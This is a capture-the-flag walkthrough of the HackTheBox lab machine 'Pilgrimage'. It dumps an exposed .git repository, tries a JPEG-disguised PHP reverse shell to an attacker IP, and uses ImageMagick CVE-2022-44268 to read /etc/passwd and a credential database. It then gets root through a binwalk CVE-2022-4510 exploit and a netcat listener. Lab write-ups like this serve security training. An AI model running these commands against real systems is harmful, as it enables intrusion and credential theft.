# Pilgrimage - Easy

Target IP: **10.129.70.110**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.70.110 -v```

Output shows standard port 22 for ssh and port 80 running Nginx 1.18.0.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 redirects us to ```http://pilgrimage.htb/```. Let's add this to our ```/etc/hosts``` file and navigate to it.

We are greeted by this home page. It seems like we can upload images to it.

![1](Screenshots/P_1.jpg)

Creating a dummy account, we get access to a dashboard where we can access the shrunken image url.

![2](Screenshots/P_2.jpg)

Let's enumerate further.

Directory enumeration gives us some interesting results, but we are forbidden from viewing it.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://pilgrimage.htb/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pilgrimage.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 9ms]
assets                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 7ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 6ms]
tmp                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 6ms]
                        [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 8ms]
:: Progress: [87651/87651] :: Job [1/1] :: 6060 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

Fuzzing with the ```common.txt``` gives us an exposed ```/.git``` directory.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://pilgrimage.htb/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pilgrimage.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 7ms]
.git/logs/              [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 9ms]
.git/index              [Status: 200, Size: 3768, Words: 22, Lines: 16, Duration: 10ms]
.htaccess               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 10ms]
.hta                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 10ms]
.htpasswd               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 10ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 12ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 12ms]
assets                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 6ms]
index.php               [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 7ms]
tmp                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 6ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 6ms]
:: Progress: [4750/4750] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Let's use ```git-dumper```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ git-dumper http://pilgrimage.htb/.git/ git
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ cd git
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~/git]
└──╼ [★]$ ls
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```

Let's explore the dumped repo.

There's a ```bulletproof.php``` file that seems to be in charge of the validation of the uploaded files. From what I can tell, it mainly checks MIME types. If so, we can simply place the magic bytes for an image file in front of a reverse shell.

Let's build our payload.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ echo -n 'FFD8FFE0' | xxd -r -p > shell.php
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ cat << 'EOF' >> shell.php
> <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'");?>
> EOF
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ file shell.php 
shell.php: JPEG image data
```

This didn't work. I thought this would be enough to bypass the filter, but let's look elsewhere.

Inside the dumped git repo, there is a ```magick``` binary.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~/git]
└──╼ [★]$ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

It is running version 7.1.0-49 beta. Let's look for publicly disclosed vulnerabilities.

This is vulnerable to CVE-2022-44268, a file disclosure vulnerability. When Magick parses an image, the image could be embedded with a local file.

I found a [PoC](https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268) here. Let's try it.

We generate an image holding a reference to ```/etc/passwd```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ ./poc.py generate -o poc.png -r /etc/passwd
```

After we upload the image on the website, it succeeds and returns the link to us.

![3](Screenshots/P_3.jpg)

We can download the image.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ wget http://pilgrimage.htb/shrunk/6ab9984ca7599.png
--2026-09-27 18:32:00--  http://pilgrimage.htb/shrunk/6ab9984ca7599.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.70.110
Connecting to pilgrimage.htb (pilgrimage.htb)|10.129.70.110|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1082 (1.1K) [image/png]
Saving to: ‘6ab9984ca7599.png’

6ab9984ca7599.png                   100%[=================================================================>]   1.06K  --.-KB/s    in 0s      

2026-09-27 18:32:00 (191 MB/s) - ‘6ab9984ca7599.png’ saved [1082/1082]
```

We can use the PoC script again to parse the resulting image, which indeed contains ```/etc/passwd```. We are looking to get access as the ```emily``` user.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ ./poc.py parse -i 6ab9984ca7599.png 
2026-09-27 18:32:50,939 - INFO - chunk IHDR found, value = b'\x00\x00\x00\x05\x00\x00\x00\x05\x08\x00\x00\x00\x00'
2026-09-27 18:32:50,939 - INFO - chunk gAMA found, value = b'\x00\x00\xb1\x8f'
2026-09-27 18:32:50,939 - INFO - chunk cHRM found, value = b'\x00\x00z&\x00\x00\x80\x84\x00\x00\xfa\x00\x00\x00\x80\xe8\x00\x00u0\x00\x00\xea`\x00\x00:\x98\x00\x00\x17p'
2026-09-27 18:32:50,939 - INFO - chunk bKGD found, value = b'\x00\xff'
2026-09-27 18:32:50,939 - INFO - chunk tIME found, value = b'\x07\xea\t\x1b\x16\x1b\x18'
2026-09-27 18:32:50,939 - INFO - chunk zTXt found, value = b'Raw profile type\x00\x00H\x89\xa5V\xe7\x15\xa30\x0c\xfe\xaf)n\x04p\x91\xf08\t!\xfb\x8fp\x9f\xe4JI\xc2\xbbK\x9e\xb1Q\xef\x86\xe8\x0f~s\xf0B\xe2\xf8\xcdo\t\xfe!\x8b\x7f\xf8)\xaf\x0eu\xef\xf1\xcc\x8e\x13o\xb6\xcf\xe2y\x99\x1e\x1cx\xe6\xc8/\x02\xd1V\x84\xccyUT\xc6@P\x14/\x0e\xbb\xcfb\xae`\xeeM\xbc\x81a\xc5\x12\x05@C!6\xd1.\xaf.\xe0\xb3(\x02\xf2 \n\x04I|\x11\xe5\xf3\xaa0P\x07\x8e\xc2gQd\x1e_\x88\x02\xac\nCt<\xfb\x88\xbf\xd7s\xc7\x8e\x16R\xf5\xb1\xa2\xe1\x9c F/\xe8\xad\x82\xa2\tB\nFL\xb7(C\xe9\x08\xee\xe1;E\xef\x05\x86\x1a=\xb6\xc4h\xfc\n\x141\x12F*U\xb2\x07\x08)\xe5\x88sA\xdfR\xb0\n\xac%\x93/yeP\x17\r\x11\x93\xd6\x10\xaf`\x07\x8e\xc3g\xd1t2>\xf1Z\xcc/\xabC\x07\xebG\x98\t\xa6\xafFo\x88\xa0\xb4\xa0\xa7\xbc:t\xb4\x9d\x06\xe3G\x82\x9f\x91\x01Ed\xaf\xa1\xc8]A\xd6]\xb3\xf5WC]Gi\x87\xff\xdd"2i\x93\xca"\xa9u\xa0\xaf\xcf\x11wl\x17\xfa\xe1\x80\xfd\xdcK\x1bY\xb0Z\xe3\xf8\xfa\xac\x14\xd4I\x06\x87\xecw\xb3\x8a\x9cU\xdf\x93@:5=\xa1>+:c\x87\xb4\x0f\xf0}Z\xe8[\xc52:\xbe\x8d<\xef\xdb3\x94*R:\x167\x05\x9cHIq\xb4\x96\xc0\x12\x94\x80\xdb\xd9\xd0\xc4}w\x94\x8a\xf6\x84|\xf4\x19\x94\xea3\xc3Kk8\xa4_\x99GX\x13M\x1f\x1d\x13\xb5P\x82\xf4\xa94\xd7gh8\xf8\xa2\xe25k\xd1\xc1\x19\x14\x1d\xf4\x85\xeas\xb4y\x88wLn7\xb9\x05.\x07t\x97*LG\xb79O\xa4\x8d\xaa\xd6[\xa9\xd6w\xbdSB+\xd769i?F\xf7\xa4E\x94\xf6\xe0\xc2\xd5\xc6\xed:\xf0\x17\xc3?\xbea\xe5\xd4\xd2\xae}8\xed\xd5]\xa9\xa0\xcf:>\xdd/9v\x1c\xd08*(\x88h\x84\x89\x9f\x83\xe6\xb9\xec\xce\x1f\x99\xa600\xf1s_yz!\x90\xda\xe3V\xfd\x8f\xb5\xb2\x17s\xc7^:\x1b,Z\x10^\x89\x90\xe68\xd8\xeb\xca\xee\xcf\xf6FG#\x134\xfe\xb3m\xc7\xe1\xafD\xbex\xee\xa4_\x92\xc5\x12\xdb\xd3U\xde\xe8[m\xfc\xce\x9bu\x83\xa9\xa7\xdd-\xaf\xfa\x82\xedy\x8a\x1f#Q\xd8r\x13)\x1f/\xf6\xf5\xb4\xe9\x18y\xd8\x84L\xfa\xfa?\xd9\xa3!B\xd1\x1as\x1d\xc6\xfeT\xaa\xba\x9d:MW\x8aK\xfem\x1f\x118\x0e"\xae>\xefN\x15\xed\xad,#:\x12\x90<\xaa\xc9n\xcfTnQ\xdbO5]\xd8p*\x8cu\x8a\xde\x9c\xd9V\x08\x0b\x8f\xcd\x1b\xcf\xcd[\xa3I\x9d\xfcN\xfa\xa3\xbe\xcd\xa0S\xc7\xd6\xf6M\x90|sm)\xf2\xfb\xec\x03\xb3;\xb0\r\xf1\x03\x1db\xea9N\x0f\xfa\x0b\xbab\xc7\xe0'
2026-09-27 18:32:50,939 - INFO - chunk IDAT found, value = b'\x08\xd7c<\xc3\xc0\xc0\xc0\xc0\xc2\xc0\xc4\xf0\xff?\x0b\xc3g\x06Vv&\xe6\xdf/Y\xff3\xfd\xfd\xcf\xfd\x8b\t\x00s?\t\xc7'
2026-09-27 18:32:50,939 - INFO - chunk tEXt found, value = b'date:create\x002026-09-27T22:27:24+00:00'
2026-09-27 18:32:50,939 - INFO - chunk tEXt found, value = b'date:modify\x002026-09-27T22:27:24+00:00'
2026-09-27 18:32:50,939 - INFO - chunk tEXt found, value = b'date:timestamp\x002026-09-27T22:27:24+00:00'
2026-09-27 18:32:50,939 - INFO - chunk IEND found, value = b''
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

In the source code of ```login.php```, we can see that it takes an sqlite file ```/var/db/pilgrimage``` for authentication. We can target this file.

```
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));
```

We want to save this to a file, so we can read the raw output from the ```identify``` command and decode it to binary.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ identify -verbose 6ab99b6ea0c7e.png | grep -Pv "^( |Image)"  | xxd -r -p > sqlite
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ file sqlite
sqlite: SQLite 3.x database, last written using SQLite version 3034001, file counter 75, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 75
```

Let's look into the database file.

We get a set of credentials in the ```users``` table.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ sqlite3 sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
images  users 
sqlite> SELECT * FROM users;
emily|abigchonkyboi123
```

Let's log in through ssh.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ ssh emily@10.129.70.110
The authenticity of host '10.129.70.110 (10.129.70.110)' can't be established.
ED25519 key fingerprint is SHA256:uaiHXGDnyKgs1xFxqBduddalajktO+mnpNkqx/HjsBw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.70.110' (ED25519) to the list of known hosts.
emily@10.129.70.110's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$ whoami
emily
```

We can get the user flag from here.

## Root Flag

We can't run sudo as ```emily```.

```
emily@pilgrimage:~$ sudo -l
[sudo] password for emily: 
Sorry, user emily may not run sudo on pilgrimage.
```

No interesting binaries with the SUID bit set either.

```
emily@pilgrimage:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/umount
```

Looking at the webroot, the ```/tmp``` and ```/shrunk``` folders have been modified very recently. These are the folders that hold the uploaded and shrunken images. There is probably a script running periodically that is in charge of clearing out these directories.

```
emily@pilgrimage:/var/www/pilgrimage.htb$ ls -la
total 26980
drwxr-xr-x 7 root root     4096 Jun  8  2023 .
drwxr-xr-x 3 root root     4096 Jun  8  2023 ..
drwxr-xr-x 6 root root     4096 Jun  8  2023 assets
-rwxr-xr-x 1 root root     5538 Jun  7  2023 dashboard.php
drwxr-xr-x 8 root root     4096 Jun  8  2023 .git
-rwxr-xr-x 1 root root     9250 Jun  6  2023 index.php
-rwxr-xr-x 1 root root     6822 Jun  7  2023 login.php
-rwxr-xr-x 1 root root       98 Feb 14  2023 logout.php
-rwxr-xr-x 1 root root 27555008 Feb 15  2023 magick
-rwxr-xr-x 1 root root     6836 Jun  7  2023 register.php
drwxrwxrwx 2 root root     4096 Sep 28 09:00 shrunk
drwxrwxrwx 2 root root     4096 Sep 28 08:40 tmp
drwxr-xr-x 4 root root     4096 Jun  8  2023 vendor
```

Let's get ```pspy64``` over to the remote machine. I want to identify the script that is being called.

After running it, I see a bash script being called.

```
2026/09/28 09:08:56 CMD: UID=0     PID=671    | /bin/bash /usr/sbin/malwarescan.sh 
```

Let's look at it. At a high level, it uses ```inotifywait``` to wait for a file to be created in the ```/var/www/pilgrimage.htb/shrunk/``` directory, extracts the filename, then uses ```binwalk``` to search for embedded files in the images.

```
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

The version of ```binwalk``` on the machine is 2.3.2.

```
emily@pilgrimage:~$ binwalk

Binwalk v2.3.2
```

This is vulnerable to CVE-2022-4510, a path traversal vulnerability that can lead to file reads and RCE. Let's try this [PoC](https://raw.githubusercontent.com/electr0sm0g/CVE-2022-4510/refs/heads/main/RCE_Binwalk.py).

Supplying our base image, IP, and port, it creates an exploit image.

```
emily@pilgrimage:~$ python3 RCE_Binwalk.py input.png 10.10.15.194 4444

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```

To trigger the ```create``` event on ```inotifywait```, we have to download the image into the ```/shrunk``` directory, so we'll transfer the exploit image back to our attack box, start up an http server, then ```wget``` for the image inside ```/shrunk```. That will trigger the alert and run ```binwalk``` on the malicious image.

After doing so, we get ```root```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-r9bkzp5tkv]─[~]
└──╼ [★]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.70.110 49428
whoami
root
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
